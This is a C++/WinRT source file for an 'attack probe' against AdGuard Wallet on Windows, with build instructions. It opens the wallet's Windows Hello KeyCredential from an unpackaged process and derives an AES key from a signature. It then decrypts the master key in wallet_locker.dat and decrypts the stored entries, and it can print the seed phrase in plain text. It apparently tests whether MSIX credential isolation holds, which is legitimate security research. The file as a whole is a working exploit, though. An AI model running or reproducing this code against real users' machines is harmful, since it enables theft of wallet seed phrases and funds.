// wallet_locker_attack_probe.cpp
//
// Standalone unpackaged Win32 probe that replays AdGuard Wallet's Windows Hello
// locker path:
//   KeyCredential OpenAsync(tag)
//   -> RequestSignAsync(UTF-16LE(dataToSign))
//   -> SHA-256(signature) -> bio-AES key
//   -> decrypt bio wrap of master key in wallet_locker.dat
//   -> decrypt locker entries (AES-GCM, Dart CryptographyUtils layout)
//
// Build (Developer PowerShell for VS 2022):
//   cl /EHsc /std:c++20 /await wallet_locker_attack_probe.cpp ^
//      /Fe:wallet_locker_attack_probe.exe ^
//      windowsapp.lib bcrypt.lib
//
// Or: .\build.ps1

#include <windows.h>

#include <winrt/Windows.Data.Json.h>
#include <winrt/Windows.Foundation.h>
#include <winrt/Windows.Foundation.Collections.h>
#include <winrt/Windows.Security.Credentials.h>
#include <winrt/Windows.Security.Cryptography.h>
#include <winrt/Windows.Security.Cryptography.Core.h>
#include <winrt/Windows.Storage.Streams.h>

#include <cstdint>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <optional>
#include <sstream>
#include <string>
#include <vector>

using namespace winrt;
using namespace Windows::Data::Json;
using namespace Windows::Foundation;
using namespace Windows::Security::Credentials;
using namespace Windows::Security::Cryptography;
using namespace Windows::Security::Cryptography::Core;
using namespace Windows::Storage::Streams;

namespace
{
	constexpr wchar_t kDefaultTag[] = L"adguard_wallet_bio_key";
	constexpr wchar_t kDefaultDataToSign[] = L"locker_authentication_request";
	constexpr wchar_t kDefaultLockerRelativePath[] = L"AdGuard Wallet\\Data\\wallet_locker.dat";

	constexpr uint32_t kNonceLength = 12;
	constexpr uint32_t kTagLength = 16;
	constexpr uint32_t kAesKeyLength = 32;

	struct Options {
		std::wstring tag = kDefaultTag;
		std::wstring dataToSign = kDefaultDataToSign;
		std::wstring lockerPath;
		bool showSeed = false;
	};

	std::wstring ToWideString(const std::string& value)
	{
		if (value.empty()) {
			return {};
		}

		const auto size = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
		std::wstring result(size, L'\0');
		MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), result.data(), size);
		return result;
	}

	std::string ToUtf8String(std::wstring_view value)
	{
		if (value.empty()) {
			return {};
		}

		const auto size = WideCharToMultiByte(CP_UTF8, 0, value.data(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
		std::string result(size, '\0');
		WideCharToMultiByte(CP_UTF8, 0, value.data(), static_cast<int>(value.size()), result.data(), size, nullptr, nullptr);
		return result;
	}

	std::wstring GetDefaultLockerPath()
	{
		wchar_t* appData = _wgetenv(L"APPDATA");
		if (appData == nullptr) {
			throw hresult_error(E_FAIL, L"APPDATA is not set.");
		}

		return std::wstring(appData) + L"\\" + kDefaultLockerRelativePath;
	}

	std::wstring ReadTextFile(const std::wstring& path)
	{
		std::ifstream input(path, std::ios::binary);
		if (!input) {
			throw hresult_error(HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND), L"Locker file not found.");
		}

		std::ostringstream buffer;
		buffer << input.rdbuf();
		return ToWideString(buffer.str());
	}

	std::vector<uint8_t> BufferToVector(const IBuffer& buffer)
	{
		std::vector<uint8_t> bytes(buffer.Length());
		if (!bytes.empty()) {
			memcpy(bytes.data(), buffer.data(), bytes.size());
		}
		return bytes;
	}

	std::vector<uint8_t> Base64Decode(const std::wstring& base64Text)
	{
		return BufferToVector(CryptographicBuffer::DecodeFromBase64String(base64Text));
	}

	std::wstring Base64Encode(const std::vector<uint8_t>& bytes)
	{
		DataWriter writer;
		writer.WriteBytes(bytes);
		return std::wstring(CryptographicBuffer::EncodeToBase64String(writer.DetachBuffer()).c_str());
	}

	std::wstring HstringToWstring(hstring value)
	{
		return std::wstring(value.c_str());
	}

	const wchar_t* KeyCredentialStatusName(KeyCredentialStatus status)
	{
		switch (status) {
		case KeyCredentialStatus::Success:
			return L"Success";
		case KeyCredentialStatus::NotFound:
			return L"NotFound";
		case KeyCredentialStatus::UserCanceled:
			return L"UserCanceled";
		case KeyCredentialStatus::UnknownError:
			return L"UnknownError";
		case KeyCredentialStatus::UserPrefersPassword:
			return L"UserPrefersPassword";
		case KeyCredentialStatus::CredentialAlreadyExists:
			return L"CredentialAlreadyExists";
		case KeyCredentialStatus::SecurityDeviceLocked:
			return L"SecurityDeviceLocked";
		default:
			return L"Unrecognized";
		}
	}

	Options ParseOptions(int argc, wchar_t* argv[])
	{
		Options options;
		for (int index = 1; index < argc; ++index) {
			const std::wstring arg = argv[index];
			if (arg == L"--show-seed") {
				options.showSeed = true;
			} else if (arg == L"--locker-path" && index + 1 < argc) {
				options.lockerPath = argv[++index];
			} else if (arg == L"--tag" && index + 1 < argc) {
				options.tag = argv[++index];
			} else if (arg == L"--data-to-sign" && index + 1 < argc) {
				options.dataToSign = argv[++index];
			} else if (arg == L"--help" || arg == L"-h") {
				std::wcout
					<< L"Usage: wallet_locker_attack_probe.exe [options]\n"
					<< L"  --locker-path <path>   wallet_locker.dat (default: %AppData%\\AdGuard Wallet\\Data\\...)\n"
					<< L"  --tag <tag>            KeyCredential tag (default: adguard_wallet_bio_key)\n"
					<< L"  --data-to-sign <text>  RequestSign payload (default: locker_authentication_request)\n"
					<< L"  --show-seed            Print decrypted seed phrase (sensitive)\n";
				exit(0);
			}
		}

		if (options.lockerPath.empty()) {
			options.lockerPath = GetDefaultLockerPath();
		}

		return options;
	}

	CryptographicKey CreateBioAesKey(const IBuffer& signatureBuffer)
	{
		auto sha256Provider = HashAlgorithmProvider::OpenAlgorithm(HashAlgorithmNames::Sha256());
		auto sha256Hash = sha256Provider.HashData(signatureBuffer);
		if (sha256Hash.Length() != kAesKeyLength) {
			throw hresult_error(E_FAIL, L"SHA-256 output is not 32 bytes.");
		}

		auto aesProvider = SymmetricKeyAlgorithmProvider::OpenAlgorithm(SymmetricAlgorithmNames::AesGcm());
		return aesProvider.CreateSymmetricKey(sha256Hash);
	}

	// Same as biometric_cipher WinrtEncryptRepositoryImpl::Decrypt
	std::wstring DecryptBioPayload(const CryptographicKey& bioAesKey, const std::wstring& base64Payload)
	{
		const auto combineBuffer = CryptographicBuffer::DecodeFromBase64String(base64Payload);
		if (combineBuffer.Length() < kNonceLength + kTagLength) {
			throw hresult_error(E_FAIL, L"Bio encrypted payload is too short.");
		}

		auto reader = DataReader::FromBuffer(combineBuffer);
		const auto nonce = reader.ReadBuffer(kNonceLength);
		const auto encryptedData = reader.ReadBuffer(combineBuffer.Length() - kNonceLength - kTagLength);
		const auto authTag = reader.ReadBuffer(kTagLength);

		const auto decryptedData = CryptographicEngine::DecryptAndAuthenticate(
			bioAesKey,
			encryptedData,
			nonce,
			authTag,
			nullptr);

		return HstringToWstring(
			CryptographicBuffer::ConvertBinaryToString(BinaryStringEncoding::Utf16LE, decryptedData));
	}

	std::vector<uint8_t> DecryptWithMasterKey(const std::vector<uint8_t>& masterKey, const std::vector<uint8_t>& payload)
	{
		if (masterKey.size() != kAesKeyLength) {
			throw hresult_error(E_INVALIDARG, L"Master key must be 32 bytes.");
		}
		if (payload.size() < kNonceLength + kTagLength) {
			throw hresult_error(E_INVALIDARG, L"Entry payload is too short.");
		}

		DataWriter keyWriter;
		keyWriter.WriteBytes(masterKey);
		const auto keyBuffer = keyWriter.DetachBuffer();

		auto aesProvider = SymmetricKeyAlgorithmProvider::OpenAlgorithm(SymmetricAlgorithmNames::AesGcm());
		const auto aesKey = aesProvider.CreateSymmetricKey(keyBuffer);

		DataWriter payloadWriter;
		payloadWriter.WriteBytes(payload);
		const auto payloadBuffer = payloadWriter.DetachBuffer();

		auto reader = DataReader::FromBuffer(payloadBuffer);
		const auto nonce = reader.ReadBuffer(kNonceLength);
		const auto encryptedData = reader.ReadBuffer(payload.size() - kNonceLength - kTagLength);
		const auto authTag = reader.ReadBuffer(kTagLength);

		const auto decrypted = CryptographicEngine::DecryptAndAuthenticate(
			aesKey,
			encryptedData,
			nonce,
			authTag,
			nullptr);

		return BufferToVector(decrypted);
	}

	std::optional<std::wstring> FindBioWrapBase64(const JsonObject& root)
	{
		if (!root.HasKey(L"masterKey")) {
			return std::nullopt;
		}

		const auto masterKey = root.GetNamedObject(L"masterKey");
		if (!masterKey.HasKey(L"wraps")) {
			return std::nullopt;
		}

		const auto wraps = masterKey.GetNamedArray(L"wraps");
		for (uint32_t index = 0; index < wraps.Size(); ++index) {
			const auto wrap = wraps.GetObjectAt(index);
			if (!wrap.HasKey(L"origin") || !wrap.HasKey(L"data")) {
				continue;
			}

			const auto origin = HstringToWstring(wrap.GetNamedString(L"origin"));
			if (origin == L"bio") {
				return HstringToWstring(wrap.GetNamedString(L"data"));
			}
		}

		return std::nullopt;
	}

	std::wstring MaskSeed(const std::string& seed)
	{
		const auto words = std::count(seed.begin(), seed.end(), ' ') + 1;
		return L"<seed decrypted, " + std::to_wstring(words) + L" words, use --show-seed to print>";
	}

	IAsyncAction RunProbeAsync(Options options)
	{
		std::wcout << L"=== AdGuard Wallet locker attack probe (unpackaged Win32) ===\n";
		std::wcout << L"Process: ";
		wchar_t processPath[MAX_PATH];
		if (GetModuleFileNameW(nullptr, processPath, MAX_PATH) != 0) {
			std::wcout << processPath << L"\n";
		} else {
			std::wcout << L"<unknown>\n";
		}

		std::wcout << L"Locker file: " << options.lockerPath << L"\n";
		std::wcout << L"KeyCredential tag: " << options.tag << L"\n";
		std::wcout << L"dataToSign: " << options.dataToSign << L"\n\n";

		std::wcout << L"[1/5] Reading wallet_locker.dat...\n";
		const auto lockerJsonText = ReadTextFile(options.lockerPath);
		const auto lockerRoot = JsonObject::Parse(lockerJsonText);

		const auto bioWrapBase64 = FindBioWrapBase64(lockerRoot);
		if (!bioWrapBase64.has_value()) {
			std::wcout << L"RESULT: No bio wrap found. Biometrics likely not enabled in this locker.\n";
			co_return;
		}

		std::wcout << L"      Bio wrap found in masterKey.wraps.\n";

		std::wcout << L"[2/5] Opening KeyCredential (Windows Hello)...\n";
		const auto openResult = co_await KeyCredentialManager::OpenAsync(options.tag);
		const auto openStatus = openResult.Status();
		std::wcout << L"      OpenAsync: " << static_cast<int>(openStatus) << L" ("
		           << KeyCredentialStatusName(openStatus) << L")\n";

		if (openStatus != KeyCredentialStatus::Success) {
			std::wcout << L"\nRESULT: ISOLATION LIKELY WORKS — unpackaged process cannot open MSIX KeyCredential.\n";
			co_return;
		}

		std::wcout << L"[3/5] RequestSignAsync(dataToSign as UTF-16LE)...\n";
		const auto credential = openResult.Credential();
		const auto dataToSignBuffer = CryptographicBuffer::ConvertStringToBinary(
			options.dataToSign,
			BinaryStringEncoding::Utf16LE);

		const auto signResult = co_await credential.RequestSignAsync(dataToSignBuffer);
		const auto signStatus = signResult.Status();
		std::wcout << L"      RequestSignAsync: " << static_cast<int>(signStatus) << L" ("
		           << KeyCredentialStatusName(signStatus) << L")\n";

		if (signStatus != KeyCredentialStatus::Success) {
			std::wcout << L"\nRESULT: Key opened but signing failed.\n";
			co_return;
		}

		std::wcout << L"[4/5] Deriving bio-AES key and decrypting master key...\n";
		const auto signatureBuffer = signResult.Result();
		const auto bioAesKey = CreateBioAesKey(signatureBuffer);

		const auto encryptedMasterKeyBytes = Base64Decode(*bioWrapBase64);
		const auto pluginInputBase64 = Base64Encode(encryptedMasterKeyBytes);

		const auto decryptedMasterKeyBase64Wide = DecryptBioPayload(bioAesKey, pluginInputBase64);
		const auto decryptedMasterKeyBase64 = ToUtf8String(decryptedMasterKeyBase64Wide);
		const auto masterKeyBytes = Base64Decode(ToWideString(decryptedMasterKeyBase64));

		if (masterKeyBytes.size() != kAesKeyLength) {
			std::wcout << L"      Master key length unexpected: " << masterKeyBytes.size() << L" bytes\n";
			std::wcout << L"\nRESULT: Bio decrypt produced invalid master key size.\n";
			co_return;
		}

		std::wcout << L"      Master key decrypted (" << masterKeyBytes.size() << L" bytes).\n";

		std::wcout << L"[5/5] Decrypting locker entries...\n";
		if (!lockerRoot.HasKey(L"entries")) {
			std::wcout << L"RESULT: No entries in locker.\n";
			co_return;
		}

		const auto entries = lockerRoot.GetNamedArray(L"entries");
		auto decryptedAny = false;

		for (uint32_t index = 0; index < entries.Size(); ++index) {
			const auto entry = entries.GetObjectAt(index);
			if (!entry.HasKey(L"id") || !entry.HasKey(L"value")) {
				continue;
			}

			const auto idBase64 = HstringToWstring(entry.GetNamedString(L"id"));
			const auto valueBase64 = HstringToWstring(entry.GetNamedString(L"value"));
			const auto entryIdBytes = Base64Decode(idBase64);
			const auto encryptedValueBytes = Base64Decode(valueBase64);
			const std::string entryIdUtf8(entryIdBytes.begin(), entryIdBytes.end());

			try {
				const auto decryptedValueBytes = DecryptWithMasterKey(masterKeyBytes, encryptedValueBytes);
				const std::string decryptedValue(decryptedValueBytes.begin(), decryptedValueBytes.end());
				decryptedAny = true;

				std::wcout << L"      Entry '" << ToWideString(entryIdUtf8) << L"': DECRYPTED\n";
				if (options.showSeed) {
					std::wcout << L"        value: " << ToWideString(decryptedValue) << L"\n";
				} else {
					std::wcout << L"        value: " << MaskSeed(decryptedValue) << L"\n";
				}
			} catch (const hresult_error& error) {
				std::wcout << L"      Entry '" << ToWideString(entryIdUtf8) << L"': decrypt failed (0x"
				           << std::hex << static_cast<uint32_t>(error.code()) << std::dec << L")\n";
			}
		}

		if (decryptedAny) {
			std::wcout << L"\nRESULT: ATTACK SUCCEEDED — unpackaged process recovered master key and seed data.\n";
			std::wcout << L"        MSIX KeyCredential isolation is NOT effective on this machine/build.\n";
		} else {
			std::wcout << L"\nRESULT: Master key recovered but no entry decrypted.\n";
		}
	}
}

int wmain(int argc, wchar_t* argv[])
{
	try {
		init_apartment();
		const auto options = ParseOptions(argc, argv);
		RunProbeAsync(options).get();
		return 0;
	} catch (const hresult_error& error) {
		std::wcerr << L"HRESULT 0x" << std::hex << static_cast<uint32_t>(error.code()) << std::dec
		           << L": " << static_cast<std::wstring>(error.message()) << L"\n";
		return 1;
	} catch (const std::exception& error) {
		std::cerr << "Exception: " << error.what() << "\n";
		return 2;
	}
}
